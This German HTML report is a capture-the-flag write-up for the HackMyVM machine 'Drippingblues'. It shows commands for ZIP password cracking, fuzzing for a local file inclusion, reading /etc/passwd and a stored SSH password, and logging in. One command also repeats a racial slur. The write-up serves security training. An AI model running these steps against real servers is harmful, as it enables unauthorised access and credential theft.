@@ -1,0 +1,552 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Drippingblues - HackMyVM - Bericht</title> <!-- Angepasster Titel -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header mit angepasstem Titel und Schwierigkeitsgrad -->
+    <div class="header-bg"> <!-- Hintergrundfarbe wird durch CSS gesteuert (#03b5f5) -->
+        <h1>Drippingblues - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, Farbe (rot) durch CSS -->
+            <div class="circle"> <!-- Segmentfarben (rot) durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe (passend zu Header) durch CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools Liste basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">zip2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">md5sum</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">find</div>
+                <!-- sudo wurde versucht, aber fehlgeschlagen -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis-Links -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#ftp-enumeration">FTP Enumeration & ZIP Analysis</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Port 80)</a></li>
+                <li><a href="#information-disclosure">Information Disclosure (robots.txt & LFI)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH Login)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Enumeration)</a></li>
+                <!-- Der tatsächliche PrivEsc-Pfad fehlt im Text -->
+                <li><a href="#conclusion">Schlussfolgerung (PrivEsc-Lücke)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerksegment durch Senden von ARP-Anfragen zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.114 und der MAC-Adresse 08:00:27:91:e9:96 (Oracle VirtualBox) wurde als Ziel identifiziert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere die Ziel-IP für nachfolgende Scans.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und ARP-Monitoring können die Erkennung erschweren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:00:00:00:00:af, IPv4: 192.168.2.129
+Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD
+192.168.2.114	08:00:27:91:e9:96	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.8: 256 hosts scanned in 1.863 seconds (137.41 hosts/sec). 2 responded
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird auf das Ziel 192.168.2.114 durchgeführt. Optionen: `-sS` (SYN Scan), `-sC` (Standard-Skripte), `-T5` (schnelles Timing), `-A -O` (umfassender Scan inkl. OS-Erkennung), `-p-` (alle Ports).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Drei offene Ports wurden gefunden:
+                *   **21 (FTP):** vsftpd 3.0.3. Anonymer Login ist erlaubt. Eine Datei `respectmydrip.zip` ist vorhanden und scheinbar für anonyme Benutzer schreibbar (`[NSE: writeable]`).
+                *   **22 (SSH):** OpenSSH 8.2p1 (Ubuntu).
+                *   **80 (HTTP):** Apache 2.4.41 (Ubuntu). Die `robots.txt` verbietet `/dripisreal.txt` und `/etc/dripispowerful.html`, was auf potenziell interessante Dateien hindeutet.
+                Das Betriebssystem wird als Linux 4.x/5.x erkannt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den anonymen FTP-Zugriff, lade `respectmydrip.zip` herunter und prüfe die Schreibrechte. Untersuche die in `robots.txt` genannten Pfade auf dem Webserver.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff oder beschränken Sie ihn stark (keine Schreibrechte, nur Lesezugriff auf nicht-sensible Daten). Überprüfen Sie die Notwendigkeit und den Inhalt der in `robots.txt` genannten Dateien. Halten Sie alle Dienste aktuell.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A -O 192.168.2.114 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 01:20 CEST
+Nmap scan report for drippingblues (192.168.2.114)
+Host is up (0.00017s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ffff:192.168.2.129
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip [NSE: writeable]
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 9e:bb:af:6f:7d:a7:9d:65:a1:b1:a1:be:91:cd:04:28 (RSA)
+|   256 a3:d3:c0:b4:c5:f9:c0:6c:e5:47:64:fe:91:c5:cd:c0 (ECDSA)
+|_  256 4c:84:da:5a:ff:04:b9:b5:5c:5a:be:21:b6:0e:45:73 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| http-robots.txt: 2 disallowed entries
+|_/dripisreal.txt /etc/dripispowerful.html
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+MAC Address: 08:00:27:91:E9:96 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.17 ms drippingblues (192.168.2.114)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.31 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="ftp-enumeration">
+             <h2>FTP Enumeration & ZIP Analysis</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Der anonyme FTP-Zugriff wird manuell überprüft. Die Datei `respectmydrip.zip` wird heruntergeladen. Versuche, das Verzeichnis zu wechseln oder Dateien hochzuladen (`put read.xml`), scheitern an fehlenden Berechtigungen, obwohl Nmap Schreibrechte für die ZIP-Datei anzeigte. Die heruntergeladene `respectmydrip.zip` wird analysiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Download der ZIP-Datei war erfolgreich. Die Schreibrechte auf dem FTP scheinen trotz Nmap-Hinweis eingeschränkt zu sein (Upload nicht möglich). Die Analyse der `respectmydrip.zip` ergibt:
+                1.  Sie ist passwortgeschützt.
+                2.  Der Hash wird mit `zip2john` extrahiert.
+                3.  Das Passwort wird mit `john` und `rockyou.txt` geknackt: `<span class="password">072528035</span>`.
+                4.  Beim Entpacken enthält sie `respectmydrip.txt` (mit dem Hinweis "just focus on 'drip'") und eine weitere passwortgeschützte Datei `secret.zip`.
+                5.  Der Versuch, `secret.zip` mit `zip2john` und `john` zu knacken, scheitert mit der `rockyou.txt`-Liste.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Behalte den Hinweis "drip" im Hinterkopf. Da `secret.zip` nicht geknackt werden konnte, konzentriere dich auf den Webserver (Port 80) und die Pfade aus `robots.txt`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff. Verwenden Sie starke Passwörter für Archive. Vermeiden Sie das Speichern verschachtelter, passwortgeschützter Archive an zugänglichen Orten. Überprüfen Sie FTP-Berechtigungen sorgfältig.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.114</span></div>
+                    <pre>
+Connected to 192.168.2.114.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.114:cyber): <span class="command">Anonymous</span>
+331 Please specify the password.
+Password: <span class="command"></span>
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> <span class="command">ls</span>
+229 Entering Extended Passive Mode (|||42128|)
+150 Here comes the directory listing.
+-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip
+226 Directory send OK.
+ftp> <span class="command">get respectmydrip.zip</span>
+local: respectmydrip.zip remote: respectmydrip.zip
+229 Entering Extended Passive Mode (|||64266|)
+150 Opening BINARY mode data connection for respectmydrip.zip (471 bytes).
+100% |*****************************************************************************************************|   471       11.26 KiB/s    00:00 ETA
+226 Transfer complete.
+471 bytes received in 00:00 (11.19 KiB/s)
+ftp> <span class="command">cd ..</span>
+250 Directory successfully changed.
+ftp> <span class="command">ls</span>
+229 Entering Extended Passive Mode (|||26670|)
+150 Here comes the directory listing.
+-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip
+226 Directory send OK.
+ftp> <span class="command">cd ..</span>
+250 Directory successfully changed.
+ftp> <span class="command">ls</span>
+229 Entering Extended Passive Mode (|||19745|)
+150 Here comes the directory listing.
+-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip
+226 Directory send OK.
+ftp> <span class="command">cd /home</span>
+550 Failed to change directory.
+ftp> <span class="command">cd ../home</span>
+550 Failed to change directory.
+ftp> <span class="command">put read.xml</span>
+local: read.xml remote: read.xml
+229 Entering Extended Passive Mode (|||47276|)
+550 Permission denied.
+ftp> <span class="command">quit</span>
+221 Goodbye.
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ls -l</span></div>
+                    <pre>...
+-rw-r--r--  1 root root       471 19. Sep 2021  respectmydrip.zip
+...</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">unzip respectmydrip.zip</span></div>
+                    <pre>Archive:  respectmydrip.zip
+[respectmydrip.zip] respectmydrip.txt password:</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">zip2john respectmydrip.zip > hash</span></div>
+                    <pre>ver 2.0 respectmydrip.zip/respectmydrip.txt PKZIP Encr: cmplen=32, decmplen=20, crc=5C92F12B ts=96AB cs=5c92 type=0
+ver 2.0 respectmydrip.zip/secret.zip is not encrypted, or stored with non-handled compression type</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                    <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">072528035</span>        (respectmydrip.zip/respectmydrip.txt)
+1g 0:00:00:02 DONE (2023-04-15 01:24) 0.3802g/s 5681Kp/s 5681Kc/s 5681KC/s 072647150..068763201&
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">unzip respectmydrip.zip</span></div>
+                    <pre>Archive:  respectmydrip.zip
+[respectmydrip.zip] respectmydrip.txt password: <span class="password">072528035</span>
+ extracting: respectmydrip.txt
+  inflating: secret.zip</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">unzip secret.zip</span></div>
+                    <pre>Archive:  secret.zip
+[secret.zip] secret.txt password:</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">zip2john secret.zip > hash</span></div>
+                     <pre>ver 2.0 secret.zip/secret.txt PKZIP Encr: cmplen=17, decmplen=12, crc=03D5A50D ts=970A cs=03d5 type=8</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:02 DONE (2023-04-15 01:25) 0g/s 6729Kp/s 6729Kc/s 6729KC/s "mariangelo1991"..7¡Vamos!
+Session completed. # Kein Passwort gefunden
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat respectmydrip.txt</span></div>
+                    <pre>just focus on "drip"</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration (Port 80)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Gobuster wird erneut eingesetzt, um Verzeichnisse und Dateien auf dem Webserver zu finden, wobei eine umfangreiche Liste von Erweiterungen verwendet wird.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Scan findet nur `index.php` und `robots.txt`. Das ist weniger als im Nmap-Scan (der die robots.txt-Inhalte anzeigte). Möglicherweise wurde eine weniger effektive Wortliste verwendet oder der vorherige Gobuster-Lauf war auf eine andere Maschine gerichtet. Entscheidend ist jedoch der Fund von `robots.txt`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt der `robots.txt`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Directory Listing deaktiviert ist.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.114 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+... (Banner) ...
+===============================================================
+[+] Url:                     http://192.168.2.114
+[+] ... (Weitere Optionen) ...
+===============================================================
+2023/04/15 01:30:05 Starting gobuster
+===============================================================
+http://192.168.2.114/index.php            (Status: 200) [Size: 138]
+http://192.168.2.114/robots.txt           (Status: 200) [Size: 78]
+...
+===============================================================
+2023/04/15 01:35:21 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+         <section id="information-disclosure">
+            <h2>Information Disclosure (robots.txt & LFI)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der `robots.txt` wird abgerufen. Sie listet `/dripisreal.txt` und `/etc/dripispowerful.html` als "Disallowed". Die erste Datei (`/dripisreal.txt`) wird abgerufen und enthält einen Hinweis auf einen Songtext und MD5-Hashing. Es wird versucht, diesen Hinweis umzusetzen, indem eine Zeichenkette aus vielen "nigga"s gebildet und deren MD5-Hash berechnet wird. Ein SSH-Login-Versuch mit diesem Hash als Passwort für den Benutzer `thugger` (der vermutlich aus dem Hinweis abgeleitet wurde) schlägt fehl. Anschließend wird `wfuzz` verwendet, um GET-Parameter auf `index.php` zu fuzzten und nach LFI zu suchen. Der Parameter `drip` wird als verwundbar identifiziert. Mit diesem Parameter wird `/etc/passwd` gelesen, was den Benutzer `thugger` bestätigt. Schließlich wird mit `?drip=/etc/dripispowerful.html` die zweite in `robots.txt` genannte Datei gelesen, welche das Klartext-Passwort `<span class="password">imdrippinbiatch</span>` enthält.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die `robots.txt` lieferte den entscheidenden Hinweis. Der erste Hinweis in `/dripisreal.txt` war komplex und führte zu einem falschen Passwort (oder war für einen anderen Zweck gedacht). Der LFI-Fund im `drip`-Parameter (passend zum Hinweis aus der ZIP-Datei) war der Schlüssel. Das Auslesen von `/etc/dripispowerful.html` über die LFI enthüllte das korrekte SSH-Passwort für den Benutzer `thugger`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie das Passwort `imdrippinbiatch` für den SSH-Login als `thugger`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle dringend. Speichern Sie keine Passwörter im Klartext in Dateien im Webserver-Verzeichnis oder `/etc`. Überprüfen Sie die Inhalte von Dateien, die in `robots.txt` erwähnt werden.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+# Inhalt von http://192.168.2.114/robots.txt
+User-agent: *
+Disallow: /dripisreal.txt
+Disallow: /etc/dripispowerful.html
+
+# Inhalt von http://192.168.2.114/dripisreal.txt
+hello dear hacker wannabe,
+
+go for this lyrics:
+
+https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html
+
+count the n words and put them side by side then md5sum it
+
+ie, hellohellohellohello >> md5sum hellohellohellohello
+
+it's the password of ssh
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo -n "nigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigganigga" |  md5sum</span></div>
+                    <pre>26ffdb7eb1b61dc39062395d246ecd53  -</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh thugger@cve.hmv</span></div>
+                    <pre>
+The authenticity of host 'cve.hmv (192.168.2.114)' can't be established.
+... (Key Fingerprint) ...
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'cve.hmv' (ED25519) to the list of known hosts.
+thugger@cve.hmv's password: <span class="password">26ffdb7eb1b61dc39062395d246ecd53</span> # Eingegeben
+Permission denied, please try again.
+... (Weitere Versuche) ...
+thugger@cve.hmv: Permission denied (publickey,password).
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.2.114/index.php?FUZZ=/etc/passwd --hh 138</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.114/index.php?FUZZ=/etc/passwd
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+0000172073:   200        57 L     107 W      3032 Ch     "drip"
+
+Total time: 130.9347
+Processed Requests: 220560
+Filtered Requests: 220559
+Requests/sec.: 1684.503
+                    </pre>
+                     <pre>
+# Zugriff via LFI auf /etc/passwd: http://192.168.2.114/index.php?drip=/etc/passwd
+# Inhalt (Auszug):
+root:x:0:0:root:/root:/bin/bash
+...
+thugger:x:1001:1001:,,,:/home/thugger:/bin/bash
+...
+
+# Zugriff via LFI auf /etc/dripispowerful.html: view-source:http://192.168.2.114/index.php?drip=/etc/dripispowerful.html
+# Inhalt (Auszug):
+password is:
+<span class="password">imdrippinbiatch</span>
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (SSH Login)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Es wird ein erneuter SSH-Login-Versuch für den Benutzer `thugger` gestartet, diesmal mit dem Passwort `imdrippinbiatch`, das durch die LFI-Schwachstelle gefunden wurde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der SSH-Login ist erfolgreich. Der initiale Zugriff auf das System als Benutzer `thugger` wurde erreicht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie Enumerationsschritte als `thugger` durch. Suchen Sie nach dem User-Flag, überprüfen Sie `sudo -l` und suchen Sie nach anderen Privilege-Escalation-Vektoren.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass das Passwort geändert wird. Beheben Sie die LFI-Schwachstelle. Überwachen Sie SSH-Logins.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh thugger@cve.hmv</span></div>
+                    <pre>
+thugger@cve.hmv's password: <span class="password">imdrippinbiatch</span> # Passwort eingegeben
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.11.0-34-generic x86_64)
+
+* Documentation:  https://help.ubuntu.com
+* Management:     https://landscape.canonical.com
+* Support:        https://ubuntu.com/advantage
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+Last login: Sun Apr 16 01:40:00 2023 from 192.168.2.129
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">thugger@drippingblues:~$ <span class="command"></span></div><!-- Thugger's Prompt -->
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation (Enumeration)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nach dem erfolgreichen Login als `thugger` werden grundlegende Enumerationsschritte durchgeführt: Auflisten des Home-Verzeichnisses (`ls -la`), Lesen der User-Flag (`cat user.txt`), Überprüfen der Sudo-Rechte (`sudo -l`) und Suchen nach SUID-Dateien (`find / -type f -perm -4000 -ls 2>/dev/null`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das User-Flag (`5C50FC503A2ABE93B4C5EE3425496521`) wird gefunden. Der Benutzer `thugger` hat keine `sudo`-Rechte. Die SUID-Suche liefert eine lange Liste von Binaries, viele davon innerhalb von Snap-Verzeichnissen (`/snap/...`). `/usr/bin/pkexec` ist ebenfalls vorhanden. Im Text wird ein Exploit für Polkit erwähnt (`CVE-2021-3560.py`), der aber nicht funktioniert hat. Es wird auf GTFOBins als alternative Lösung verwiesen, aber der spezifische Befehl oder die Methode zur Eskalation von `thugger` zu `root` wird im bereitgestellten Text *nicht dokumentiert*.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da der Polkit-Exploit fehlschlug, überprüfen Sie GTFOBins auf Methoden zur Ausnutzung von Standard-SUID-Binaries (z.B. `find`, `cp`, `bash`, etc., falls vorhanden und falsch konfiguriert) oder anderen gefundenen Binaries. Untersuchen Sie die spezifische Version von `pkexec` auf Anfälligkeit für PwnKit (CVE-2021-4034). *Der genaue Weg zur Root-Eskalation fehlt in der Vorlage.*
+                <br>
+                <strong>Empfehlung (Admin):</strong> Halten Sie das System und alle Pakete (insbesondere Polkit/pkexec) aktuell, um bekannte Schwachstellen zu vermeiden. Minimieren Sie die Anzahl der SUID-Binaries. Konfigurieren Sie `sudo` nach dem Least-Privilege-Prinzip.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Befehle als thugger -->
+                    <div class="prompt" style="color: #ffffff;">thugger@drippingblues:~$ <span class="command">ls -la</span></div>
+                    <pre>
+total 64
+drwxr-xr-x 14 thugger thugger 4096 Eyl 19  2021 .
+drwxr-xr-x  3 root    root    4096 Eyl 18  2021 ..
+-rw-------  1 thugger thugger    8 Eyl 19  2021 .bash_history
+drwxr-xr-x 10 thugger thugger 4096 Eyl 19  2021 .cache
+drwxr-xr-x 11 thugger thugger 4096 Eyl 19  2021 .config
+drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Desktop
+drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Documents
+drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Downloads
+drwxr-xr-x  3 thugger thugger 4096 Eyl 19  2021 .local
+drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Music
+drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Pictures
+drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Public
+drwx------  2 thugger thugger 4096 Eyl 19  2021 .ssh
+drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Templates
+-r-x------  1 thugger thugger   32 Eyl 19  2021 user.txt
+drwxr-xr-x  2 thugger thugger 4096 Eyl 18  2021 Videos
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">thugger@drippingblues:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">5C50FC503A2ABE93B4C5EE3425496521</span></pre>
+                    <div class="prompt" style="color: #ffffff;">thugger@drippingblues:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+[sudo] password for thugger: <span class="password">imdrippinbiatch</span> # Passwort eingegeben
+Sorry, user thugger may not run sudo on drippingblues.
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">thugger@drippingblues:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+      816     84 -rwsr-xr-x   1 root     root        85064 Kas 29 14:53 /snap/core20/1852/usr/bin/chfn
+      822     52 -rwsr-xr-x   1 root     root        53040 Kas 29 14:53 /snap/core20/1852/usr/bin/chsh
+      891     87 -rwsr-xr-x   1 root     root        88464 Kas 29 14:53 /snap/core20/1852/usr/bin/gpasswd
+      975     55 -rwsr-xr-x   1 root     root        55528 Şub  7  2022 /snap/core20/1852/usr/bin/mount
+      984     44 -rwsr-xr-x   1 root     root        44784 Kas 29 14:53 /snap/core20/1852/usr/bin/newgrp
+      999     67 -rwsr-xr-x   1 root     root        68208 Kas 29 14:53 /snap/core20/1852/usr/bin/passwd
+     1109     67 -rwsr-xr-x   1 root     root        67816 Şub  7  2022 /snap/core20/1852/usr/bin/su
+     1110    163 -rwsr-xr-x   1 root     root       166056 Oca 16 16:06 /snap/core20/1852/usr/bin/sudo
+     1168     39 -rwsr-xr-x   1 root     root        39144 Şub  7  2022 /snap/core20/1852/usr/bin/umount
+     1257     51 -rwsr-xr--   1 root     systemd-resolve    51344 Eki 25 16:09 /snap/core20/1852/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     1629    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1852/usr/lib/openssh/ssh-keysign
+      139    121 -rwsr-xr-x   1 root     root              123560 Şub 22 18:11 /snap/snapd/18596/usr/lib/snapd/snap-confine
+    # ... (lange Liste, gekürzt - enthält viele Snap-Binaries) ...
+   132020     32 -rwsr-xr-x   1 root     root               31032 Ağu 16  2019 /usr/bin/pkexec # Potenziell interessant
+   # ... (Weitere Standard-SUID-Binaries) ...
+                    </pre>
+                     <pre>
+# Hinweis im Text: Polkit-Exploit (CVE-2021-3560) hat nicht funktioniert.
+# Lösung erfolgte stattdessen über GTFOBins (Spezifische Methode nicht dokumentiert).
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Der Proof-of-Concept (Root-Zugriff) fehlt im Text -->
+         <section id="conclusion">
+            <h2>Schlussfolgerung (PrivEsc-Lücke)</h2>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nach dem Erhalt des initialen Zugriffs als Benutzer `thugger` und dem Finden des User-Flags wurde eine SUID-Enumeration durchgeführt. Der bereitgestellte Text weist darauf hin, dass ein Polkit-Exploit fehlschlug und die Lösung zur Root-Eskalation über eine Methode aus GTFOBins erfolgte. Die spezifischen Befehle oder die ausgenutzte SUID-Binary für diesen Schritt sind jedoch im vorliegenden Text nicht dokumentiert.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie den tatsächlichen Privilege-Escalation-Pfad (z.B. welcher Befehl von GTFOBins verwendet wurde), um den Bericht zu vervollständigen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Analysieren Sie die SUID-Binaries und Systemkonfigurationen, um den tatsächlichen Eskalationspfad zu identifizieren und zu schließen. Wenden Sie das Prinzip der geringsten Rechte konsequent an und halten Sie das System gepatcht.
+            </p>
+         </section>
+
+       <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                     <!-- Hinweis: Dieser Flag-Wert weicht von dem ab, der zuvor als 'thugger' gelesen wurde. Es wird der Wert aus der finalen Flag-Sektion des Originaltextes verwendet. -->
+                    <div class="flag-value"><span class="password">c7d0a8de1e03b25a6f7ed2d91b94dad6</span></div>
+                </div>
+                <div class="flag-entry">
